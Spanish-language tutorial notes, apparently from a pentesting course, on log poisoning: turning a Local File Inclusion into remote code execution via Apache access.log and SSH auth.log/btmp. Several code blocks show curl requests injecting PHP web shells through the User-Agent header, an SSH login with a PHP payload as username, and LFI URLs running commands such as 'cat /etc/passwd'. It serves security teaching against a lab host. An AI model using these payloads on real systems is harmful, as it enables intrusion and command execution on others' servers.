# Log Poisoning (LFI -> RCE)

Tags: #LFI #OWASP #Explotacion #RCE

El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **Local File Inclusion (LFI)** para lograr una **Remote Code Execution (RCE)** en el servidor.

Como ejemplos para esta clase, trataremos de envenenar los recursos ‘**auth.log**‘ de **SSH** y ‘**access.log**‘ de **Apache**, comenzando mediante la explotación de una vulnerabilidad LFI primeramente para acceder a estos archivos de registro. Una vez hayamos logrado acceder a estos archivos, veremos cómo manipularlos para incluir código malicioso.

En el caso de los logs de SSH, el atacante puede inyectar código PHP en el campo de **usuario** durante el proceso de autenticación. Esto permite que el código se registre en el log ‘**auth.log**‘ de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.

En el caso del archivo ‘**access.log**‘ de Apache, el atacante puede inyectar código PHP en el campo **User-Agent** de una solicitud HTTP. Este código malicioso se registra en el archivo de registro ‘access.log’ de Apache y se ejecuta cuando el archivo de registro es leído. De esta manera, el atacante también puede lograr una ejecución remota de comandos en el servidor.

Cabe destacar que en algunos sistemas, el archivo ‘**auth.log**‘ no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como ‘**btmp**‘.

Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo ‘auth.log’. Sin embargo, en sistemas basados en Red Hat y CentOS, los eventos de autenticación de SSH se registran en el archivo ‘btmp’. Aunque a veces pueden haber excepciones.

Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.

## HTML Apache

```bash 
# Ingresar al grupo 'adm' e ir a la siguiente ruta para ver los logs
/var/log
```

```shell
❯ cat access.log       # Ver los logs en Apache

# Ruta típica de logs de Apache en donde podemos ver los logs, incluyendo los del User Agent ('Mozilla/5.0 (Windows NT...)') 'User Agent': Es un campo del protocolo HTTP que puede utilizarse para transmitir información mas o menos detallada sobre el dispositivo de consulta que tramita la solicitud

'index.php?filename=/var/log/apache2/access.log'  
```

```bash 
# Hacer la solicitud a la pagina y mirar en los log el User-Agent y la petición que hicimos

❯ curl -s -X GET "http://localhost/test" -H "User-Agent: PROBANDO"

	# H = Cabecera que queremos modificar
```

## Inyección de comandos 

```shell
# Podemos inyectar comandos si estamos en una pagina en PHP **Nota**: La funcion System debe de estar habilitada. Para saber si hay funciones deshabilitadas usar el siguiente comando:

❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php phpinfo(); ?>"   # Miras el phpinfo en la web y nos fijamos en 'disable_functions' para verificar que no este system ahi 
```

```shell
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system('whoami'); ?>"
```

```shell
# Controlar la ejecución del comando
❯ curl -s -X GET "http://localhost/test" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"     # Escapamos el dollar porque en bash a veces genera conflictos

Notas:
	1. index.php?filename=/var/log/apache2/access.log&cmd=whoami    # Colocar al final '&cmd=comando' para ejecutar cualquier comando
```

## SSH

```shell
# Ingresar al grupo 'adm' e ir a la siguiente ruta para ver los logs
/var/log
```

```shell
❯ cat auth.log            # Mirar los logs en SSH
❯ cat btmp
```

```shell
❯ ssh test@172.17.0.2     # Autenticar con ssh
```

```shell
❯ ssh '<?php system($_GET["cmd"]); ?>'@172.17.0.2

Notas:
	1. Se puede controlar la ejecución del comando, si ese archivo tiene capacidad de escritura
	2. En 'index.php?filename=/var/log/btmp&cmd=cat /etc/passwd' colocar al final '&cmd=whoami' para ejecutar cualquier comando
```